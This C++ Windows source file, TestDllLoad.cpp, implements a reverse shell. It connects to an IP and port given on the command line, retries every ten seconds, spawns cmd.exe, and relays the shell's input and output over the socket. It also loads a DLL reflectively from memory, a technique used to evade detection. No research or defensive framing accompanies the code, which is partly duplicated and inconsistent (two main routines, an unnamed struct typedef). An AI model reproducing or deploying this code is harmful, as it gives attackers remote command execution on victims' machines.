// TestDllLoad.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <iostream>
#define WIN32_LEAN_AND_MEAN
#ifndef _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <assert.h>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <winnt.h>
#include <malloc.h>
#pragma warning(disable : 4996)
#include "../incl/MemLoaderTest.h"
#include "../incl/SockOperations.h"

//#define DLL_FILE TEXT("..\\SampleDLL\\SampleDLL.dll")
#define DLL_FILE  TEXT("D:\\VC++\\TestDllLoad\\sdll.dll")
int main1(int argc, char *argv[]);
typedef struct FUNARG {
	PIPE_HANDLES gPipes;
	SOCKET_IN_OUT_HANDLE gRead;
	SOCKET_IN_OUT_HANDLE gWrite;
	SOCKET s = INVALID_SOCKET;
	PROCESS_INFORMATION pinfpo;
	HANDLE *ThreadHandle;
	int debugFlag;
	int argc;
	char **argv;
};


PIPE_HANDLES gPipes;
SOCKET_IN_OUT_HANDLE gRead;
SOCKET_IN_OUT_HANDLE gWrite;
SOCKET s = INVALID_SOCKET;
PROCESS_INFORMATION pinfpo;
HANDLE ThreadHandle[3];
extern int debugFlag;


void CleanUp() {
	debugg("Cleaning up...\n");
	debugg("Trminating Threads...\n");

	debugg("Closing socket... this must terminate Threads...\n");
	SocketOperations::CloseSocket(s);
	debugg("Socket closed....\n");

	debugg("Termnitaning Shell....\n");
	TerminateProcess(pinfpo.hProcess, 1);
	WaitForSingleObject(pinfpo.hProcess, INFINITE);
	debugg("Shell Terminated....\n");

	debugg("Closing thread handles...\n");
	CloseHandle(ThreadHandle[0]);
	CloseHandle(ThreadHandle[1]);

	debugg("Closing pipes handles...\n");
	CloseHandle(gPipes.g_hChildStd_OUT_Rd);
	CloseHandle(gPipes.g_hChildStd_OUT_Wr);
	CloseHandle(gPipes.g_hChildStd_IN_Rd);
	CloseHandle(gPipes.g_hChildStd_IN_Wr);

	debugg("Closing process handles...\n");
	CloseHandle(pinfpo.hProcess);
	CloseHandle(pinfpo.hThread);
	debugg("Cleaning up finished...\n");
}

void CleanUp(FUNARG arg) {
	debugg("Cleaning up...\n");
	debugg("Trminating Threads...\n");

	debugg("Closing socket... this must terminate Threads...\n");
	SocketOperations::CloseSocket(arg.s);
	debugg("Socket closed....\n");

	debugg("Termnitaning Shell....\n");
	TerminateProcess(arg.pinfpo.hProcess, 1);
	WaitForSingleObject(arg.pinfpo.hProcess, INFINITE);
	debugg("Shell Terminated....\n");

	debugg("Closing thread handles...\n");
	CloseHandle(arg.ThreadHandle[0]);
	CloseHandle(arg.ThreadHandle[1]);

	debugg("Closing pipes handles...\n");
	CloseHandle(arg.gPipes.g_hChildStd_OUT_Rd);
	CloseHandle(arg.gPipes.g_hChildStd_OUT_Wr);
	CloseHandle(arg.gPipes.g_hChildStd_IN_Rd);
	CloseHandle(arg.gPipes.g_hChildStd_IN_Wr);

	debugg("Closing process handles...\n");
	CloseHandle(arg.pinfpo.hProcess);
	CloseHandle(arg.pinfpo.hThread);
	debugg("Cleaning up finished...\n");
}


int _mainFun(FUNARG arg) {
	debugFlag = 0;
	if (arg.argc < 3) {
		debugg("Please specify IP & port.....\n");
		exit(1);
	}
	//switch on logging 
	if (arg.argc > 3) {
		debugFlag = 1;
	}

	arg.gWrite.rw = WRITE;
	arg.gRead.rw = READ;
	int pause = 10 * 1000;
	char *ip = arg.argv[1];
	char *port = arg.argv[2];

	while (true) {
		debugg("Waiting for  %d sec.\n", pause);
		Sleep(pause);

		//create Socket 
		debugg("Trying to connect to %s, port %s \n", ip, port);
		arg.s = SocketOperations::CreateSocket(ip, port);     //(char *)"10.240.110.48", (char *)"4001");
		if (arg.s == INVALID_SOCKET) { debugg("Could not connect to %s:%s .... \n", ip, port); continue; }//; exit(INVALID_SOCKET);
		debugg("Connected to %s:%d ...\n", ip, port);

		arg.gWrite.s = s;
		arg.gRead.s = s;

		//create the pipes & spawn cmd shell
		SECURITY_ATTRIBUTES saAttr;
		saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
		saAttr.bInheritHandle = TRUE;
		saAttr.lpSecurityDescriptor = NULL;
		SocketOperations::CreatePipes(&arg.gPipes, &saAttr);
		debugg("Creating Shell...\n");
		TCHAR cmdName[] = _T("cmd.exe");
		arg.pinfpo = SocketOperations::CreateChildProcess(cmdName, &arg.gPipes);  //spawn shell

		//create read & write threads
		debugg("Creating Threads...\n");
		arg.gRead.handle =arg. gPipes.g_hChildStd_OUT_Rd;
		arg.gWrite.handle = arg.gPipes.g_hChildStd_IN_Wr;

		//fill handles
		arg.ThreadHandle[0] = SocketOperations::CreateThread(&arg.gRead);
		arg.ThreadHandle[1] = SocketOperations::CreateThread(&arg.gWrite);
		arg.ThreadHandle[2] = arg.pinfpo.hProcess;

		debugg("Waiting  for process or thread  to finish...\n");

		//wait for either thread or process to finish....
		WaitForMultipleObjects(sizeof(arg.ThreadHandle) / sizeof(arg.ThreadHandle[0]), arg.ThreadHandle, false, INFINITE);   //pinfpo.hProcess, INFINITE);
		debugg("Process or thread  finished ...\n");

		//clean up finally
		CleanUp(arg);
	}

	return 0;
}

FUNARG arg;
int main(int argc, char *argv[]) {
	main1(argc, argv);
	
	arg.argc = argc;
	arg.argv = argv;

	//arg.ThreadHandle = 
	//_mainFun(arg);
}


int main1(int argc, char *argv[])
{ 
	debugFlag = 0;
	if (argc < 3) {
		debugg("Please specify IP & port.....\n");
		exit(1);
	}
	//switch on logging 
	if (argc > 3) {
		debugFlag = 1;
	}

	gWrite.rw = WRITE;
	gRead.rw = READ;
	int pause = 10 * 1000;
	char *ip = argv[1];
	char *port= argv[2];

	while (true) {
		debugg("Waiting for  %d sec.\n", pause);
		Sleep(pause);

		//create Socket 
		debugg("Trying to connect to %s, port %s \n", ip, port);
		s = SocketOperations::CreateSocket(ip, port);     //(char *)"10.240.110.48", (char *)"4001");
		if (s == INVALID_SOCKET) { debugg("Could not connect to %s:%s .... \n", ip , port); continue; }//; exit(INVALID_SOCKET);
		debugg("Connected to %s:%d ...\n", ip, port);

		gWrite.s = s;
		gRead.s = s;

		//create the pipes & spawn cmd shell
		SECURITY_ATTRIBUTES saAttr;
		saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
		saAttr.bInheritHandle = TRUE;
		saAttr.lpSecurityDescriptor = NULL;
		SocketOperations::CreatePipes(&gPipes, &saAttr);
		debugg("Creating Shell...\n");
		TCHAR cmdName[] = _T("test.exe");
		pinfpo = SocketOperations::CreateChildProcess(cmdName, &gPipes);  //spawn shell

		//create read & write threads
		debugg("Creating Threads...\n");
		gRead.handle = gPipes.g_hChildStd_OUT_Rd;
		gWrite.handle = gPipes.g_hChildStd_IN_Wr;
		
		//fill handles
		ThreadHandle[0] = SocketOperations::CreateThread(&gRead);
		ThreadHandle[1] = SocketOperations::CreateThread(&gWrite);
		ThreadHandle[2] = pinfpo.hProcess;

		debugg("Waiting  for process or thread  to finish...\n");

		//wait for either thread or process to finish....
		WaitForMultipleObjects(sizeof(ThreadHandle) / sizeof(ThreadHandle[0]), ThreadHandle, false, INFINITE);   //pinfpo.hProcess, INFINITE);
		debugg("Process or thread  finished ...\n");

		//clean up finally
		CleanUp();
	}
	
	return 0;
}



void TestLoadMemModule() {
	MemLoaderTest::LoadFromFile(DLL_FILE);
	printf("\n\n");
	size_t size = 0;
	void *fmem  = MemLoaderTest :: ReadLibrary(&size, DLL_FILE);
	HMEMORYMODULE h = MemLoader :: MemLoadLibrary(fmem, size);
	HMEMORYMODULE h2 = MemLoader :: MemLoadLibrary(fmem, size);
	myfun padr =  (myfun)MemLoader :: MemGetProcAddress(h, "myfun");
	myfun padr2 = (myfun)MemLoader :: MemGetProcAddress(h2, "myfun");
	padr();
	printf("\n\n");
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
